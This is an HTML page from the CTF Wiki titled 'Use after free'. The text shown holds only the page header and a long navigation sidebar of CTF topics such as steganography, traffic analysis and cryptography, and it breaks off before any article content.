
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.0.2">
    
    
      
        <title>Use after free - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.f1caf91c.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.3f72e892.min.css">
        
      
    
    
    
      
        
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="preference" data-md-color-primary="" data-md-color-accent="">
      
        <script>matchMedia("(prefers-color-scheme: dark)").matches&&document.body.setAttribute("data-md-color-scheme","slate")</script>
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#use-after-free" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            CTF Wiki
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Use after free
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Introduction" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history-zh/" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode-zh/" class="md-nav__link">
      Introduction to CTF Competition Form
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content-zh/" class="md-nav__link">
      CTF Contest Content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience-zh/" class="md-nav__link">
      Offline Attack and Defense Experience Summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc-zh/" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources-zh/" class="md-nav__link">
      Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Misc" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction-zh/" class="md-nav__link">
      Miscellaneous Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon-zh/" class="md-nav__link">
      Information Gathering Technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Code Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        Code Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication-zh/" class="md-nav__link">
      Commonly Used Coding in the Communication Field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer-zh/" class="md-nav__link">
      Computer Related Coding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern-zh/" class="md-nav__link">
      Commonly Used Encodings in the Real World
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix-zh/" class="md-nav__link">
      Forensic Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Image Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Image Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction-zh/" class="md-nav__link">
      Introduction to Image Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png-zh/" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg-zh/" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif-zh/" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic Packet Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Traffic Packet Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        <span class="md-nav__icon md-icon"></span>
        Traffic Packet Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction-zh/" class="md-nav__link">
      Introduction to Traffic Packet Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix-zh/" class="md-nav__link">
      PCAP File Repairing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Protocol Analysis" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        <span class="md-nav__icon md-icon"></span>
        Protocol Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/README-zh/" class="md-nav__link">
      Overview of Protocol Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark-zh/" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP-zh/" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS-zh/" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP-zh/" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS-zh/" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI-zh/" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB-zh/" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data-zh/" class="md-nav__link">
      Data Extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed Package Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Compressed Package Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        <span class="md-nav__icon md-icon"></span>
        Compressed Package Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip-zh/" class="md-nav__link">
      ZIP Format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar-zh/" class="md-nav__link">
      RAR Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction-zh/" class="md-nav__link">
      Audio Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk Memory Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Disk Memory Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        <span class="md-nav__icon md-icon"></span>
        Disk Memory Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem-zh/" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Other" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        <span class="md-nav__icon md-icon"></span>
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc-zh/" class="md-nav__link">
      pyc File
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction-zh/" class="md-nav__link">
      Introduction to Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic Mathematics
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Basic Mathematics" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        <span class="md-nav__icon md-icon"></span>
        Basic Mathematics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Classical Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        <span class="md-nav__icon md-icon"></span>
        Classical Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction-zh/" class="md-nav__link">
      Introduction to Classical Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic-zh/" class="md-nav__link">
      Single table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic-zh/" class="md-nav__link">
      Multi-table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others-zh/" class="md-nav__link">
      Other Types of Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary-zh/" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stream Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        <span class="md-nav__icon md-icon"></span>
        Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo Random Number Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pseudo Random Number Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        <span class="md-nav__icon md-icon"></span>
        Pseudo Random Number Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng-zh/" class="md-nav__link">
      Cryptographic Security Pseudo-random Number Generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linear Congruence Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        <span class="md-nav__icon md-icon"></span>
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Feedback Shift Register" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        <span class="md-nav__icon md-icon"></span>
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/" class="md-nav__link">
      Linear Feedback Shift Register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/" class="md-nav__link">
      Nonlinear Feedback Shift Register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Special Stream Cipher" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        <span class="md-nav__icon md-icon"></span>
        Special Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4-zh/" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Block Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        <span class="md-nav__icon md-icon"></span>
        Block Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction-zh/" class="md-nav__link">
      Introduction to Block Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations-zh/" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des-zh/" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea-zh/" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes-zh/" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck-zh/" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group Mode
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Group Mode" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        <span class="md-nav__icon md-icon"></span>
        Group Mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-zh/" class="md-nav__link">
      Padding Methods
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb-zh/" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc-zh/" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb-zh/" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb-zh/" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr-zh/" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Asymmetric Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Asymmetric Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        <span class="md-nav__icon md-icon"></span>
        Asymmetric Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction-zh/" class="md-nav__link">
      Introduction to Asymmetric Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="RSA" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        <span class="md-nav__icon md-icon"></span>
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/" class="md-nav__link">
      RSA Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" class="md-nav__link">
      Modulo-related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
